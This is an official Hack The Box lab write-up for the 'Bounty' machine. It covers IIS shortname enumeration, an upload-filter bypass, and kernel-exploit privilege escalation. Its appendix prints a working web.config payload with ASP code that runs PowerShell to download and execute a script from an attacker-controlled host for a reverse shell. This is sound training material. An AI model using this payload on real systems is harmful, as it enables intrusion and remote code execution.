# Bounty

*Converted from: Bounty.pdf*

---

# Bounty
## **2 [nd] November 2018 / Document No D18.100.25**

**Prepared By: egre55**

**Machine Author: mrb3n**

**Difficulty: Easy**

**Classification: Official**


Page 1 / 13


## **SYNOPSIS**

Bounty is an easy to medium difficulty machine, which features an interesting technique to

bypass file uploader protections and achieve code execution. This machine also highlights the

importance of keeping systems updated with the latest security patches.


## **Skills Required**


  - Basic knowledge of VBScript or C#,

VB.NET


## **Skills Learned**


  - web.config payload creation

  - Identification of missing security

patches

  - Exploit selection and execution


Page 2 / 13


## **Enumeration** **Nmap**

masscan -p1-65535 10.10.10.93 --rate=1000 -e tun0 > ports


ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')


nmap -Pn -sV -sC -p$ports 10.10.10.93


Nmap reveals an IIS installation on the default port. Visual inspection of the homepage reveals an

image but nothing that seems exploitable, so further enumeration of files and directories will be

required.


Page 3 / 13


## **IIS Shortname Scanner**

Before brute-forcing file and directory names, it is worth checking if the server is vulnerable to

tilde / shortname enumeration.


This vulnerability is caused by a tilde character "~" in a GET or OPTIONS request, which allows for

disclosure of 8.3 filenames (short names). In 2010, Soroush Dalili and Ali Abbasnejad discovered

the original bug (GET request). Soroush Dalili later discovered that newer IIS installations are

vulnerable with OPTIONS. If a shortname file exists, a vulnerable IIS installation will respond with

a 404, and with a 200 if the file doesn’t exist.


It is confirmed that Bounty is vulnerable to IIS shortname disclosure.


Soroush has created a Java-based IIS Shortname Scanner, and running this against Bounty

reveals that a directory starting with “upload” and an asp/aspx file beginning with “transf” are

present.


java -jar /opt/IIS-ShortName-Scanner/iis_shortname_scanner.jar 2 20 http://10.10.10.93

/opt/IIS-ShortName-Scanner/config.xml


Page 4 / 13


## **Dirsearch**

Selecting just those words that match this criteria results in a much reduced wordlist, and the file

“transfer.aspx” and directory “uploadedfiles” are found immediately.


Page 5 / 13


## **Exploitation** **Burp Suite**

It doesn’t seem possible to upload an aspx webshell directly, and so it is worth checking if any

other file types are allowed. After obtaining a list of IIS/ASP extensions, the upload request is sent

to Burp Intruder.


curl --silent https://msdn.microsoft.com/en-us/library/2wawkw1c.aspx | grep "<p>." | awk -F">"

'{print $2}'| awk -F"<" '{print $1}' | tr ' ' '\n' | grep "^\." | sed -e 's/,//g' > iis_extensions.txt


The response length for .config is different and inspection reveals that it was uploaded

successfully.


Page 6 / 13


​


## **web.config Payload Creation**

Soroush Dalili also discovered that ASP code can be included within a web.config, and provides a

PoC. Further details are available below at Soroush’s blog.


[https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)


003random was able to weaponize this and this PoC file and details of an exploitation are below.


[https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/](https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/)


The web.config file below **(Appendix A)** ​ can be used.


After uploading the web.config and navigating to “http://10.10.10.93/uploadedfiles/web.config”, a

reverse shell is received.


Page 7 / 13



​



​


## **Privilege Escalation** **Identification of Missing Patches**

It seems that no hotfixes have been applied, which makes it likely vulnerable to kernel exploits.


Page 8 / 13


## **Upgrade PowerShell Shell**

The current bare PowerShell shell is upgraded. Windows Server 2008 R2 doesn’t ship with

Windows Defender and in the absence of other Anti-Virus, the msfvenom created payload won’t

be detected. A 64-bit Meterpreter session is received.


Page 9 / 13


## **Exploit Selection and Execution**

Running the “multi/recon/local_exploit_suggester” module identifies two possible exploits, both

of which are successful.


Page 10 / 13


Page 11 / 13


## **Appendix A**

<?xml version="1.0" encoding="UTF-8"?>


<configuration>


<system.webServer>


<handlers accessPolicy="Read, Script, Write">


<add name="web_config" path="*.config" verb="*" modules="IsapiModule"

scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified"

requireAccess="Write" preCondition="bitness64" />


</handlers>


<security>


<requestFiltering>


<fileExtensions>


<remove fileExtension=".config" />


</fileExtensions>


<hiddenSegments>


<remove segment="web.config" />


</hiddenSegments>


</requestFiltering>


</security>


</system.webServer>



Page 12 / 13


<appSettings>


</appSettings>


</configuration>


<%


Set objShell = CreateObject("WScript.Shell")


strCommand = "cmd /c powershell.exe -c IEX (New-Object

Net.Webclient).downloadstring('http://10.10.14.3/shell.ps1')"


Set objShellExec = objShell.Exec(strCommand)


strOutput = objShellExec.StdOut.ReadAll()


WScript.StdOut.Write(strOutput)


WScript.Echo(strOutput)


%>



_web.config_


Page 13 / 13


